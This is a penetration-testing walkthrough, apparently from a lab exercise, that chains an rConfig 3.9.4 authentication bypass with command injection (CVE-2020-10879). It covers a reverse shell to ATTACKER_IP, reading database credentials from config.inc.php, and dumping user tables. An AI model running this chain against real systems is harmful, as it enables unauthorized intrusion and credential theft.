# rConfig

rConfig `3.9.4` exposed over HTTPS on TCP/8081 can be chained from authentication bypass to authenticated command injection for an `apache` shell.

## Discovery

Nmap indicators:

```text
8081/tcp open  http  Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: 400 Bad Request
```

Plain HTTP to the port may show:

```text
Reason: You're speaking plain HTTP to an SSL-enabled server port.
```

Browse with HTTPS:

```text
https://TARGET:8081/login.php
rConfig - Configuration Management
```

The version is visible in the page footer:

```text
rConfig Version 3.9.4
```

The authenticated settings page can leak useful environment information:

```text
https://TARGET:8081/settings.php
PHP Version: 5.4.16
OS Version: Linux quackerjack 3.10.0-1127.10.1.el7.x86_64
Database Verson: 5.5.65-MariaDB
Database Name: rconfig
Database Connection: Localhost via UNIX socket
```

## Auth Bypass to Temporary Admin

Exploit-DB `48878.py` can create a temporary admin user. Configure the target URL with HTTPS and the trailing slash:

```python
target="https://TARGET:8081/"
```

Run the PoC and choose user creation for the authentication bypass:

```bash
python3 48878.py
```

Successful path:

```text
Choose method for authentication bypass:
        1) User creation
        2) User enumeration + User edit
Method>1
(+) User test created
```

The observed temporary credentials were:

```text
test:Testing1@
```

Use the temporary admin instead of changing the real admin password.

## Authenticated RCE

Use Exploit-DB `48241.py` (`search.crud.php` command injection, CVE-2020-10879) with the temporary admin account:

```bash
searchsploit -m php/webapps/48241.py
nc -nlvp 445
python3 48241.py https://TARGET:8081/ test 'Testing1@' ATTACKER_IP 445
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
bash: no job control in this shell
bash-4.2$
```

Confirm context:

```bash
id
# uid=48(apache) gid=48(apache) groups=48(apache)
pwd
# /home/rconfig/www/lib/crud
```

## rConfig Database Credentials

After getting a shell, rConfig database credentials were available in the application directory:

```bash
cd /home/rconfig
cat config.inc.php
```

Observed values:

```php
define('DB_PORT', '3306');
define('DB_NAME', 'rconfig');
define('DB_USER', 'rconfig_user');
define('DB_PASSWORD', 'RconfigUltraSecurePass');
```

Use them locally to enumerate the application database:

```bash
mysql -u rconfig_user -h 127.0.0.1 -p
```

Useful tables:

```sql
use rconfig;
show tables;
select * from users;
select * from active_users;
```

## References

- https://www.exploit-db.com/exploits/48878
- https://www.exploit-db.com/exploits/48241
